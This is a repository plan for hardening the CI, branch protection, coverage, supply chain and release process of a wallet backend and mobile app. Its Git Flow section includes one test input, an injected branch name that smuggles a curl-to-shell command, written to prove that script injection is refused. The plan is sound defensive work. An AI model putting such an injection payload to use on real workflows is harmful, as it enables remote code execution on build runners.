# Technical foundation

The machinery that makes quality **enforced by the build and the platform, not by memory**.
Each item names the choice, why it is the strongest one available for this repository, what
was rejected, and the observable check that proves it is in place.

The bar is deliberately high: a wallet core where one unreviewed line can move money is the
place for the strictest settings a tool offers, not its defaults. Where the strict choice has
a real cost, the cost is written next to it.

State on 2026-11-19, `develop` at `d99623d`: no `.github/`, no CI, no coverage tool, no static
analysis beyond the architecture tests, no dependency scan. Already in place and kept:
`HexagonalArchitectureTest`, `ModuleBoundariesTest`, `TestPyramidTest`,
`MigrationNamingConventionTest`, `ConfigurationHygieneTest`, self-redacting `Pin` /
`PhoneNumber` / `OtpCode`, secrets without fallback.

Coverage baseline measured on 2026-11-13 at `f7cf39d` (JaCoCo through a temporary init script):
all suites **91.9 % lines / 83.9 % branches**; unit suite alone 52.9 / 62.6, with `domain` at
93.1 / 83.4 and `auth/application` at **30.0 / 0**.

---

## Principles

1. **Fail, never warn.** A check that only warns is ignored by the second week. Every gate
   below blocks the merge.
2. **Ratchet, never a fixed number.** Thresholds start at the measured value and can only go
   up. A global percentage hides where the risk is.
3. **Prove it red first.** Each gate is shown failing on a throwaway pull request before it
   is declared in place.
4. **Pin everything that executes.** Actions by commit SHA, the Gradle wrapper by checksum,
   dependencies by lock file and verification metadata, Node by version file.
5. **Least privilege by default.** Every workflow starts with read-only permissions and
   widens only per job.
6. **The hexagon stays clean.** `application/` and `ports/` keep an empty framework
   allow-list: instrumentation, flags and tracing live in adapters and `config/`.
7. **The API and the app never block each other.** Two pipelines, two release lines, one
   contract checked by machine.
8. **Decisions with a rejected alternative get an ADR** (ADR-010 onward).

---

## P0 — Foundations

Nothing else is enforceable without these. Order matters: the required checks must exist
before branch protection makes them required, or every merge blocks on a check that never
reports.

### 1. Git Flow guardrails

- [ ] `.github/workflows/git-flow.yml`, triggered by `pull_request` only — **never**
      `pull_request_target`, which runs fork code with a write token.
- [ ] Top-level `permissions: {}`; each job asks only for `contents: read`.
- [ ] Branch-name check: `^(feature|hotfix)/[a-z0-9-]+$` and
      `^release/(api|mobile)-v[0-9]+\.[0-9]+$`, plus the right base: `feature/*` into
      `develop` only; `hotfix/*` and `release/*` into `main` and `develop`.
- [ ] Commit lint over `git log --no-merges <base>..<head>` — **by range, never by date**,
      so a back-dated commit is still judged and the retired `[#module] feature:` history is
      never re-judged. Conventional Commits subject
      `^(feat|fix|refactor|test|docs|perf|chore|revert)(\([a-z-]+\))?!?: .+`.
- [ ] Written in POSIX shell, no Node or commitlint dependency: nothing to scan, nothing to
      update, runnable locally.
- [ ] Untrusted input (branch name, PR title) reaches scripts only through `env:`, quoted —
      never interpolated as `${{ … }}` inside `run:` (script injection).
- [ ] `.github/pull_request_template.md`: summary, evidence, checklist, and a warning that the
      repository is public — synthetic data only, no `.env` value, token, OTP or real phone
      number.
- [ ] **zizmor** (static analyser for GitHub Actions) runs on every change to `.github/`, at
      its strictest persona, and fails on any finding.
- [ ] A required check that fails when `.github/**` changes without the label
      `guardrail-change`: a PR cannot quietly weaken the rules it is judged by. CODEOWNERS
      review was rejected — with a single maintainer, GitHub refuses self-approval and every
      such PR would deadlock.

*Done when* throwaway PRs with a bad branch name, a wrong base, a commit without a type, and
an injected branch name (`feature/a";curl${IFS}x|sh;#`) are each refused, and nothing runs.

### 2. API pipeline — `.github/workflows/api-ci.yml`

- [ ] Triggers: every PR, every push to `develop` and `main`.
- [ ] **Path filter inside the job**, not in `on.paths`: a required check filtered at the
      trigger never reports on a PR that touches only `mobile/**` and blocks it forever as
      "Expected". The job runs, sees no API change, and reports success in seconds.
- [ ] `gradle/actions/wrapper-validation` first: a tampered `gradle-wrapper.jar` would run
      arbitrary code on the runner.
- [ ] `actions/setup-java` with Temurin 21 (see item 15 for 25), `gradle/actions/setup-gradle`
      with the cache read-only on PRs and read-write on `develop`.
- [ ] Gradle **configuration cache** and **build cache** on, `--no-daemon` off (the action
      manages it), `org.gradle.caching=true` in `gradle.properties`.
- [ ] Unit, integration and e2e as **separate tasks and separate check runs** (item 5), unit
      first: a red unit test answers in about 30 s instead of 2 min 44 s.
- [ ] Testcontainers on the GitHub-hosted Ubuntu runner (Docker is present); container reuse
      off in CI; one PostgreSQL per JVM through `KoraPostgres`, as today.
- [ ] JUnit XML published as check annotations, so a failure points at the line in the PR.
- [ ] **No test retry.** A flaky test is a defect with a backlog item, never re-run until
      green: in a ledger, flakiness is usually a race.
- [ ] Every third-party action pinned by full commit SHA, with the version in a comment.
- [ ] `step-security/harden-runner` in audit mode first, then `egress-policy: block` with the
      allow-list it observed: a compromised dependency cannot exfiltrate from the runner.
- [ ] `concurrency` group per ref, `cancel-in-progress` on PRs only.

*Done when* a red test, a red architecture test and a tampered wrapper each block the merge,
and a `mobile/**`-only PR shows this check green, not pending.

### 3. Mobile pipeline — `.github/workflows/mobile-ci.yml`

- [ ] Same trigger and in-job path filter rule, on `mobile/**`.
- [ ] Node pinned by `mobile/.nvmrc` (does not exist today), read by `actions/setup-node`;
      `engines` in `package.json` matching it, with `engine-strict`.
- [ ] `npm ci` (lock file only), then `npm run typecheck`, `npm run lint` (already
      `--max-warnings=0`), `npm run format:check` (exists but is not in `verify` today),
      `npm test -- --coverage`, `npm run audit`.
- [ ] `npm audit signatures`: verifies registry signatures and provenance of every installed
      package.
- [ ] Jest `coverageThreshold` set to the measured baseline, then ratcheted like the API.

*Done when* the API and the app each merge while the other's pipeline is red.

### 4. Platform versions

- [ ] **Spring Boot 4.0.3 → 4.0.8**: closes the jackson-databind 2.20.2 CVEs (8.1); the
      dependency scan of item 7 fails without it.
- [ ] **Testcontainers 1.20.4 → the version the Boot BOM manages** (2.0.3 in the 4.0.1 BOM):
      `build.gradle` pins 1.20.4 by hand, against the BOM. Testcontainers 2 renamed its
      modules (`testcontainers-postgresql`, `testcontainers-junit-jupiter`); drop the explicit
      versions and let the BOM decide.
- [ ] Gradle **version catalog** (`gradle/libs.versions.toml`): one place for every version.

### 5. Branch protection — GitHub rulesets, applied last in P0

- [ ] Rulesets (not classic protection) on `develop` and `main`: pull request required,
      required checks from items 1–3 (and 7–8 once they exist), conversations resolved,
      **merge commits only** (squash and rebase off at repository level), no force-push, no
      deletion, **signed commits required**.
- [ ] **Bypass list empty**, rules enforced on administrators. Break-glass is a PR that edits
      the ruleset, carrying the `guardrail-change` label.
- [ ] 0 required approvals: with one maintainer, GitHub refuses self-approval. Independent
      review is recorded on the PR, not faked with a second account.
- [ ] Tags `api/v*` and `mobile/v*` protected from deletion and moves.
- [ ] The applied ruleset exported as JSON under `.github/rulesets/` and updated in the same
      PR as any settings change, so drift shows in history.
- [ ] **Require branches to be up to date before merging.** The repository is user-owned,
      and GitHub offers the merge queue to organisation-owned repositories only. Without a
      queue, this rule is what guarantees that the checks ran against the exact result of
      the merge, not against a stale base. Recorded gap: no batching of concurrent PRs —
      acceptable with one maintainer; revisit if the repository moves to an organisation.

*Done when* a direct push, a force-push and a deletion on `develop` and `main` are refused for
the admin too, and an unsigned commit cannot merge.

---

## P1 — Measured quality

### 6. Coverage — JaCoCo, four instruments

- [ ] `test` split into `unitTest`, `integrationTest`, `e2eTest` (JVM test suites plugin),
      matching the package levels `TestPyramidTest` already asserts. `check` depends on all
      three; `build` stays the full gate.
- [ ] **Ratchet** — all suites, per module: floors in a versioned file
      (`config/coverage-floors.properties`), starting at 91 % lines / 83 % branches globally.
      The build fails below the floor and prints the new value when above, so raising it is a
      one-line diff.
- [ ] **Pyramid gate** — `*/domain/**` and `*/application/**` measured on `unitTest` alone:
      domain 93 / 83 now, 95 / 90 as target; application at today's value per module.
      Coverage that only e2e provides is not coverage of the domain.
- [ ] **Critical paths at 100 % branches** — a named list in the build (`Ledger`,
      `Transaction`, the `*State` classes, `RetryPolicy`, the use cases that call the
      provider). A class enters when its gaps are closed; leaving needs a justification in
      the same diff, as `FRAMEWORK_ALLOW_LIST` does.
- [ ] Exclusion: `KoraCoreApplication.main` only. `config/` and `adapters/` are measured.
- [ ] XML reports for Sonar; HTML as a CI artifact.

### 7. Close the gaps the measure revealed

- [ ] Unit tests with the in-memory doubles for `RegisterService`, `LoginService`,
      `VerifyOtpService` (`auth/application` at 30 % in the unit suite).
- [ ] `ReversePaymentService` failure paths: 21 lines and 6 branches covered by no suite.
- [ ] `RetryPolicy` branches; `AccountBlockedException`, `DuplicateEmailException`,
      `MailDeliveryException` thrown in `src/main` and reached by no test.

### 8. Compile-time correctness — Error Prone + NullAway

- [ ] **Error Prone** on every compile, warnings as errors, with a curated list of extra
      checks enabled. Catches at compile time what Sonar finds after the fact.
- [ ] **NullAway** in JSpecify mode: null-safety checked by the compiler. Spring Framework 7
      is annotated with JSpecify, so the boundary with the framework is checked too.
- [ ] Cost, decided in an ADR: `@NullMarked` lives in `package-info.java`, and
      `org.jspecify` would be the **first entry of `FRAMEWORK_ALLOW_LIST`** for `domain`,
      `application` and `ports`. JSpecify is annotations only, with no runtime dependency; the
      justification is exactly that line.
- [ ] **Spotless** with palantir-java-format, checked in CI, applied locally: formatting is
      never a review comment.

### 9. Supply chain

- [ ] **Gradle dependency locking** (`lockAllConfigurations()`) and **dependency
      verification** (`gradle/verification-metadata.xml`, SHA-256 and signatures): a
      re-published artifact under the same version fails the build.
- [ ] **OSV-Scanner** on `gradle.lockfile` and `mobile/package-lock.json`, failing on any
      known vulnerability of CVSS ≥ 7 not listed with a dated reason in an ignore file.
      Preferred to OWASP dependency-check: faster, no NVD API key, one tool for both stacks.
- [ ] `actions/dependency-review-action` on PRs: blocks a PR that *adds* a vulnerable or
      licence-incompatible dependency.
- [ ] `gradle/actions/dependency-submission` on `develop`: the Gradle graph reaches GitHub's
      dependency graph and its alerts.
- [ ] **Renovate** rather than Dependabot: grouped updates, lock-file maintenance, Gradle
      version catalogs and GitHub Actions digests in one place, a dependency dashboard.
      Branch names configured to pass the branch check (`feature/renovate-<topic>`). Needs the
      Renovate GitHub app — a maintainer action.
- [ ] **Secret scanning with push protection** in the repository settings (free for public
      repositories), plus **gitleaks** in CI for the history and for what push protection
      does not know.
- [ ] **CycloneDX SBOM** for the API (Gradle plugin) and the app (`@cyclonedx/cyclonedx-npm`),
      built on every `develop` push and attached to releases.

### 10. Static analysis — CodeQL and SonarQube Cloud

- [ ] **CodeQL** (free for public repositories) for Java and JavaScript/TypeScript, with the
      `security-extended` query suite, on PRs and weekly. Results gate the merge on new
      high or critical alerts.
- [ ] **SonarQube Cloud** (free for public repositories). A maintainer creates the
      organisation and the token, stored as the `SONAR_TOKEN` secret.
- [ ] Two Sonar projects, one per product, each reading its own coverage (JaCoCo XML, Jest
      lcov).
- [ ] Quality gate on new code: coverage ≥ 90 %, 0 bugs, 0 vulnerabilities, 0 unreviewed
      hotspots, duplication < 3 %, maintainability A, cognitive complexity ≤ 15 per method.
      Required check.

### 11. OpenSSF Scorecard

- [ ] `ossf/scorecard-action` weekly and on `main`: an external measure of the repository's
      security posture (pinned actions, token permissions, branch protection, signed
      releases). The score is a ratchet like coverage.

---

## P2 — Production grade

### 12. Mutation testing — PIT

- [ ] `pitest` with the JUnit 5 plugin on `*/domain/**`, **incremental history** so a PR only
      re-mutates what changed.
- [ ] First run records the baseline score; the threshold is that score, ratcheted. Coverage
      proves the lines ran; mutation proves the assertions would notice a change.
- [ ] Runs on PRs that touch `domain/`; full run nightly.

### 13. Observability — OpenTelemetry

- [ ] `spring-boot-starter-opentelemetry` (managed by the Boot 4 BOM): Micrometer
      Observation bridged to OpenTelemetry, OTLP export of traces, metrics and logs — **in
      every profile**, not only `perf` (closes state of view L-15).
- [ ] Observations in **adapters only**: the REST edge, the `TransactionBoundary`
      implementation, the provider adapter, JDBC. TX-1, provider I/O and TX-2 come out as
      distinct spans **without** a single Micrometer import in `application/`.
- [ ] Trace id linked to the existing correlation id; incoming `traceparent` honoured; the
      app sends `traceparent` on every call.
- [ ] RED metrics on every endpoint and provider operation; business metrics: operations by
      outcome, `UNKNOWN` count, active holds and their age, retries, retry exhaustion.
      Exemplars link a latency bucket to a trace.
- [ ] **Cardinality guard**: a test fails if a meter carries a customer id, a phone number or
      an amount as a label.
- [ ] Structured JSON logs (Boot's native structured logging), with `trace_id` and `span_id`.
- [ ] Local stack as a compose profile: OpenTelemetry Collector + Grafana LGTM. First alert
      rules (stuck `INITIALIZED` / `AUTHORIZED`, provider error rate, retry exhaustion), each
      with a runbook entry. Rules versioned in the repository.

### 14. API contract — machine-checked

- [ ] springdoc generates `openapi.json` in the build; the file is **committed** under
      `api-contract/`, so every contract change is a visible diff.
- [ ] **oasdiff** in the API pipeline: a breaking change (removed field, narrowed type, new
      required parameter, changed status) fails unless the PR carries the label
      `breaking-change` and a versioned rollout.
- [ ] The app's API types are **generated** from the committed spec (`openapi-typescript`):
      contract drift becomes a TypeScript compile error in the mobile pipeline.

### 15. Java 25 LTS and virtual threads — decided by measurement

- [ ] Java 25 is the current LTS. JEP 491 (Java 24) stopped `synchronized` from pinning
      virtual threads, which removes the main reason not to use them.
- [ ] The payment path blocks about 1.4 s on the provider while holding no connection
      (ADR-004). Virtual threads (`spring.threads.virtual.enabled=true`) let Tomcat hold
      thousands of such waits without a large platform-thread pool.
- [ ] Adopt only with a k6 run against the ADR-005 gates, before and after, recorded in an
      ADR. The HikariCP pool size still bounds concurrent transactions; virtual threads move
      the limit, they do not remove it.

### 16. Feature flags

- [ ] A `FeatureFlags` port in the kernel; static per-profile configuration
      `kora.features.*`; one inventory (name, type, owner, creation date, removing change)
      validated at boot — an unknown or ill-typed flag stops the application.
- [ ] Read only in `config/` (wiring the old or the new use case) or `adapters/in` (an
      endpoint off answers 404). Never on a financial invariant, a security control or the
      audit trail. OpenFeature can sit behind the same port later, when runtime switching is
      needed.

### 17. Acceptance suite — black-box BDD

- [ ] Cucumber-JVM on the JUnit Platform suite engine, in an `acceptanceTest` task, against
      the **packaged jar** started in CI with a Testcontainers PostgreSQL — the artefact that
      ships, not a test context.
- [ ] Assertions only on what a customer, an operator or an auditor can observe: HTTP
      responses, balances, history. `TestPyramidTest` taught the new level.
- [ ] `@money` and `@security` scenario sets run on every PR as a regression net.

### 18. Database migrations

- [ ] **squawk** lints every new migration for PostgreSQL operations that take dangerous
      locks (`ADD COLUMN … DEFAULT` on large tables, `CREATE INDEX` without `CONCURRENTLY`,
      `NOT NULL` without a validated `CHECK`). Backs the expand / contract rule.
- [ ] A CI job applies every migration to a database built from the **previous release's**
      schema, then runs `flyway validate`: a migration that only works on an empty database
      fails here.

### 19. Performance guard

- [ ] Nightly workflow running the k6 smoke of `perf/` against the ADR-005 SLO gates,
      thresholds as failures; trend kept as an artefact. A regression is found the next
      morning, not at the next load test.

### 20. Releases — one line per product

- [ ] **git-cliff** computes the next version and the changelog from Conventional Commits,
      scoped by path (`--include-path` for the API, `mobile/**` for the app). Works with Git
      Flow release branches, unlike tools that assume trunk-based release PRs.
- [ ] Signed tags `api/vX.Y.Z` and `mobile/vX.Y.Z`; GitHub release with the artefact, its
      SBOM, and **build provenance attestations** (`actions/attest-build-provenance`, SLSA
      Build Level 2+), verifiable with `gh attestation verify`.
- [ ] Release checklist: rollback written and tried (previous jar on the new schema), flags
      able to switch new behaviour off.

---

## Later, with roadmap Step 9 (containers)

- [ ] Image built with Jib or buildpacks onto a distroless, non-root base; read-only root file
      system.
- [ ] Trivy image scan as a required check; cosign signature and SBOM attestation on the image.

---

## Order

```
1 → 2 → 3 → 4 → 5        foundations; protection last, once its checks report
6 ∥ 7, then 8 → 9 → 10 → 11
12 → 13 → 14 → 15 → 16 → 17 → 18 → 19 → 20
```

## Decisions to record as ADRs

| Decision | Rejected alternative |
|---|---|
| Commit lint in shell, by range | commitlint (Node dependency); date-based exemption (back-dating) |
| `guardrail-change` label check | CODEOWNERS review (self-approval deadlock) |
| Rulesets with an empty bypass list, 0 approvals | admin bypass; a second account to fake approval |
| Coverage ratchet + pyramid gate + critical list | one global percentage |
| `org.jspecify` as the first `FRAMEWORK_ALLOW_LIST` entry | no compile-time null-safety |
| OSV-Scanner + dependency-review | OWASP dependency-check |
| Renovate | Dependabot |
| Committed OpenAPI spec, oasdiff, generated client types | hand-maintained contract document only |
| Java 25 + virtual threads, if the k6 run says so | stay on 21 |
| git-cliff with per-product tags | release-please (trunk-based release PRs) |

## Maintainer actions outside the code

- [ ] Create the SonarQube Cloud organisation; store `SONAR_TOKEN`.
- [ ] Install the Renovate GitHub app.
- [ ] Enable secret scanning with push protection, and private vulnerability reporting.
- [ ] Set up SSH commit signing locally (required by the ruleset).
- [ ] Set the repository default workflow token to read-only; require approval for workflows
      from outside contributors.
